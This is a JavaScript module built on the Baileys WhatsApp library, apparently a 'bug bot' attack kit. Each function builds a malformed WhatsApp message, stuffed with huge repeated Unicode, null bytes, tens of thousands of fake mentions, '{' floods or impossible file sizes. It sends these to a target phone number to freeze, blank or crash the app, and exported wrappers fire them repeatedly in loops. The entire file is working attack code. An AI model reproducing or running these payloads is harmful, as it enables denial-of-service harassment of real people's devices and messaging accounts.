const {
    default: makeWASocket,   
    prepareWAMessageMedia,   
    removeAuthState,  
    useMultiFileAuthState,   
    DisconnectReason,   
    fetchLatestBaileysVersion,   
    makeInMemoryStore,   
    generateWAMessageFromContent,   
    generateWAMessageContent,   
    generateWAMessage,  
    jidDecode,   
    proto,   
    delay,  
    relayWAMessage,   
    getContentType,   
    generateMessageTag,  
    getAggregateVotesInPollMessage,   
    downloadContentFromMessage,   
    fetchLatestWaWebVersion,   
    InteractiveMessage,   
    makeCacheableSignalKeyStore,   
    Browsers,   
    generateForwardMessageContent,   
    MessageRetryMap
} = require("@whiskeysockets/baileys"); 

const fs = require('fs');  
const crypto = require('crypto');

async function InvisHard(client, target, mention = false) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "hardtype",
                    contentText:
                        "INVISHARDER",
                    footerText: "InvisibleHard༑",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "hardtype" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await client.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await client.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "InvisHarder" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
            console.log('successfull sendding DellayHard');
        }

async function bulldozer(client, isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await client.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function delay1(client, target, mention = false) {
    const glitchText = "𓆩⛧𓆪".repeat(3000) + "\n" + "‎".repeat(3000); // simbol + invisible
    
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: `╔═━━━✥◈✥━━━═╗\n  惡𝐌𝐀𝐋𝐙𝐇𝐎𝐒𝐓...| 𝐒𝐔𝐍𝐆𝐎𝐃𝐒𝐄𝐍𝐉𝐔🚀\n╚═━━━✥◈✥━━━═╝\n${glitchText}`,
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await client.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "⚠️ SAHRIL VIEWONCE BUG V4" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
// END FUNCTION DELAY

async function freezeSqL(client, target) {
    await client.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "com.snowcorp.stickerly.android.stickercontentprovider 4fd4787a-6411-4116-acde-53cc59b95de5",
      name: "ꦾ".repeat(60000),
      publisher: "ោ៝".repeat(30000),
      stickers: [
            {
              fileName: "HzYPQ54bnDBMmI2Alpu0ER0fbVY6+QtvZwsLEkkhHNg=.webp",
              isAnimated: true,
              emojis: ["👾", "🩸"],
              accessibilityLabel: "@raldzzxyz_",
              stickerSentTs: " x ",
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              mimetype: "application/pdf"
            },
            {
              fileName: "GRBL9kN8QBxEWuJS3fRWDqAg4qQt2bN8nc1NIfLuv0M=.webp",
              isAnimated: false,
              emojis: ["🩸", "👾"],
              accessibilityLabel: "@raldzzxyz_",
              stickerSentTs: " x ",
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              mimetype: "application/pdf"
            }
          ],
      fileLength: Math.floor(99.99 * 1073741824).toString(),
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
      remoteJid: "X",
      participant: target,
      stanzaId: client.generateMessageTag(),
      forwardingScore: 9999,
      isForwarded: true,
      businessMessageForwardInfo: {
        businessOwnerJid: target
      },
      mentionedJid: [
         target, "13135550002@s.whatsapp.net",
             ...Array.from({ length: 35000 }, () =>
                  `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
             )
         ],       
       quotedMessage: {
         nativeFlowMessage: {
           messageParamsJson: "{".repeat(100000)
         }
       },
       externalAdReply: {
         showAdAttribution: true,
         thumbnailUrl: "https://files.catbox.moe/ykvioj.jpg",
         mediaType: 1,
         renderLargerThumbnail: true
       },
       disappearingMode: {
         initiator: "CHANGED_IN_CHAT",
         trigger: "CHAT_SETTING"
       },
     },
      packDescription: "ោ៝".repeat(50000),
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "com.snowcorp.stickerly.android.stickercontentprovider 4fd4787a-6411-4116-acde-53cc59b95de5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: Math.floor(99.99 * 1073741824).toString(),
      stickerPackOrigin: "USER_CREATED"
      }
  }, {});
}

async function trashdevice(client, target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `𝐈𝐍‌‌𝐃𝐈Σ𝐓𝐈𝐕𝚵⃰‌⃟༑‌⃟༑𝐅𝐋𝚯𝚯𝐃𝐁‌𝐔𝐑𝐒𝐇 ラ‣ 𐎟`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "ngewe ama maklo #hades" + "ꦾ".repeat(150000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "ALWAYSAQIOO" }],
                        isForwarded: true,
                        quotedMessage: {
        documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "999999999999",
           pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "Alwaysaqioo The Juftt️",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
      }
                    }
                    }
                }
            }
        }
    };

    client.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}

async function BlankVisco(client, target) {
client.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(20000) + "@1".repeat(20000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "Hati hati kena blank" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}

async function locationX(client, target) {
    console.log("locationX Attack");

    const generateLocationMessage = {
        viewOnceMessage: {
            message: {
                locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0,
                    name: "Malzhost",
                    address: "\u0000",
                    contextInfo: {
                        mentionedJid: [
                            target,
                            ...Array.from({ length: 40000 }, () =>
                                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ],
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent("status@broadcast", generateLocationMessage, {});

    await client.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    }, {
        participant: target
    });
}

async function Hitamlayar(client, target, fJids = false) {
const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        stickerPackMessage: {
          stickerPackId: "com.snowcorp.stickerly.android.stickercontentprovider 4fd4787a-6411-4116-acde-53cc59b95de5",
          name: `𝐌𝐀𝐋𝐙𝐇𝐎𝐒𝐓 𝐈𝐌 𝐁𝐀𝐂𝐊 𝐒𝐄𝐍𝐉𝐔 𝐊𝐈𝐋𝐋 𝐘𝐎𝐔 ⁉️🔕` + "ោ៝".repeat(30000),
          publisher: `𝐂𝐎𝐑𝐙𝐙𝐀 𝐈𝐌 𝐁𝐀𝐂𝐊 𝐒𝐄𝐍𝐉𝐔 𝐊𝐈𝐋𝐋 𝐘𝐎𝐔 ⁉️` + "ោ៝".repeat(30000),
          caption: "𝐌𝐀𝐋𝐙𝐇𝐎𝐒𝐓 𝐈𝐌 𝐁𝐀𝐂𝐊 𝐒𝐄𝐍𝐉𝐔 𝐊𝐈𝐋𝐋 𝐘𝐎𝐔 ⁉️",
          stickers: [
            {
              fileName: "HzYPQ54bnDBMmI2Alpu0ER0fbVY6+QtvZwsLEkkhHNg=.webp",
              isAnimated: true,
              emojis: ["👾", "🩸"],
              accessibilityLabel: "@tamainfinity",
              stickerSentTs: "who know's ?",
              isAvatar: false,
              isAiSticker: true,
              isLottie: true,
              mimetype: "application/pdf"
            },
            {
              fileName: "GRBL9kN8QBxEWuJS3fRWDqAg4qQt2bN8nc1NIfLuv0M=.webp",
              isAnimated: false,
              emojis: ["🩸", "👾"],
              accessibilityLabel: "@tamainfinity_",
              stickerSentTs: "who know's ?",
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              mimetype: "application/pdf"
            }
          ],
          fileLength: "728050",
          fileSha256: "jhdqeybzxe/pXEAT4BZ1Vq01NuHF1A4cR9BMBTzsLoM=",
          fileEncSha256: "+medG1NodVaMozb3qCx9NbGx7U3jq37tEcZKBcgcGyw=",
          mediaKey: "Wvlvtt7qAw5K9QIRjVR/vVStGPEprPr32jac0fig/Q0=",
          directPath: "/v/t62.15575-24/25226910_966451065547543_8013083839488915396_n.enc?ccb=11-4&oh=01_Q5AaIHz3MK0zl_5lrBfsxfartkbs4sSyx4iW3CtpeeHghC3_&oe=67AED5B0&_nc_sid=5e03e0",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9741,
            mentionedJid: ["13135550002@s.whatsapp.net"],
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            dataSharingContext: {
              showMmDisclosure: true
            },
            quotedMessage: {
              callLogMesssage: {
              isVideo: false,
              callOutcome: "REJECTED",
              durationSecs: "1",
              callType: "VOICE_CHAT",
                participants: [
                  { jid: target, callOutcome: "CONNECTED" },
                  { jid: "0@s.whatsapp.net", callOutcome: "REJECTED" }
                ]
              }
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: true,
              id: "9741OURQ"
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            },
            forwardedNewsletterMessageInfo: {
              newsletterName: "𝐒𝐄𝐍𝐉𝐔-𝐂𝐋𝐈𝐂𝐊" + "ោ៝".repeat(10),
              newsletterJid: "120363321780343299@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              thumbnailUrl: 'https://files.catbox.moe/d060i3.jpg',
              mediaType: 1,
              renderLargerThumbnail: true
            }
          },
          packDescription: "𝐌𝐀𝐋𝐙𝐇𝐎𝐒𝐓 ✦ 𝐁𝐄𝐆𝐈𝐍𝐄𝐑" + "ោ៝".repeat(100000),
          jpegThumbnail: null,
          mediaKeyTimestamp: "1736088676",
          trayIconFileName: "com.snowcorp.stickerly.android.stickercontentprovider 4fd4787a-6411-4116-acde-53cc59b95de5.png",
          thumbnailDirectPath: "/v/t62.15575-24/25226910_966451065547543_8013083839488915396_n.enc?ccb=11-4&oh=01_Q5AaIHz3MK0zl_5lrBfsxfartkbs4sSyx4iW3CtpeeHghC3_&oe=67AED5B0&_nc_sid=5e03e0",
          thumbnailSha256: "FQFP03spSHOSBUTOJkQg/phVS1I0YqtoqE8DoFZ/cmw=",
          thumbnailEncSha256: "OALtE35ViGAkU7DROBsJ1RK1dgma/dLcjpvUg62Mj8c=",
          thumbnailHeight: 999999999,
          thumbnailWidth: 999999999,
          imageDataHash: "c6a15de8c2d205c6b1b344476f5f1af69394a9698ed1f60cb0e912fb6a9201c4",
          stickerPackSize: "723949",
          stickerPackOrigin: "THIRD_PARTY"
        }
      }
    }
  }, { userJid: target });
  await client.relayMessage(
    target,
    msg.message,
    fJids
      ? { participant: { jid: target, messageId: msg.key.id } }
      : {}
  );
}
// END FUNCTION BLANK UI

async function invisSqL(client, target, mention = false) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "ᏨᏒᎯᏕᎻᎬᏒᏕ ᏠᏁ ᎻᎬᏒᎬ",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [target],
                participant: target,
                remoteJid: target,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [1000, 2000, 3000, 4000],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "ᏨᏒᎯᏕᎻᎬᏒᏕ ᎨᏁ ᎻᎬᏒᎬ"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(90000)
          }
        }
      }
    }
  }, {});

  await client.relayMessage(target, msg.message, {
    participant: { jid: target },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}

async function CrlSqL(client, isTarget) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { video: fs.readFileSync("./musik1.mp3") },
    { upload: client.waUploadToServer }
  );

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "FnX-" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "🧬⃟༑⌁⃰𝐓͈𝐚𝐦͢𝐚 𝐂𝐨𝐧ͯ͢𝐜𝐮͢𝐞𝐫𝐫𝐨𝐫ཀ͜͡🪅",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "Finix AI Broadcast",
              body: "Trusted System",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://tama.example.com",
              showAdAttribution: false // trigger 1
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) // trigger 2
      }
    });
  }

  const msg = generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "FnX" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
              externalAdReply: {
                title: "Finix Engine",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://finix-ai.example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await client.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
}

async function NexsusForce(client, IsTarget) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "𝑭𝒊𝒏𝒛𝒛 𝑻𝒉𝒆𝒆 𝑴𝒐𝒅𝒛𝒛𝒛 ᝄ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "𝑵𝒆𝒙𝒔𝒖𝒔 𝑻𝒉𝒆 𝑴𝒐𝒅𝒛𝒛 ᝄ",
                address: "zuu",
              },
            },
            body: {
              text: "𝑵𝒆𝒙𝒔𝒖𝒔 𝑰𝒔 𝑯𝒆𝒓𝒆 ᝄ",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: IsTarget,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await client.relayMessage(IsTarget, message, {
      messageId: null,
      participant: { jid: IsTarget },
      userJid: IsTarget,
    });
  } catch (err) {
    console.log(err);
  }
}

async function FloxCrl(client, isTarget) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "Lower",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "Foxzy",
                address: "Lover",
              },
            },
            body: {
              text: "Lower",
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000)
          },
            contextInfo: {
              participant: isTarget,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await client.relayMessage(isTarget, message, {
      messageId: null,
      participant: { jid: isTarget },
      userJid: isTarget,
    });
  } catch (err) {
    console.log(err);
  }
}
// END FUNCTION FC

async function SenjuDelay(client, target) {
  for (let i = 0; i < 5; i++) {
     await InvisHard(client, target);    
     bulldozer(client, target);
     delay1(client, target);
    }
}

async function SenjuBlank(client, target) {
  for (let i = 0; i < 5; i++) {
     await freezeSqL(client, target);    
     trashdevice(client, target);
     BlankVisco(client, target);
     locationX(client, target);
     Hitamlayar(client, target);
    }
}

async function SenjuFC(client, target) {
  for (let i = 0; i < 20; i++) {
     await invisSqL(client, target);    
     CrlSqL(client, target);
     NexsusForce(client, target);
     FloxCrl(client, target);
    }
}

module.exports = {  SenjuDelay, SenjuBlank, SenjuFC }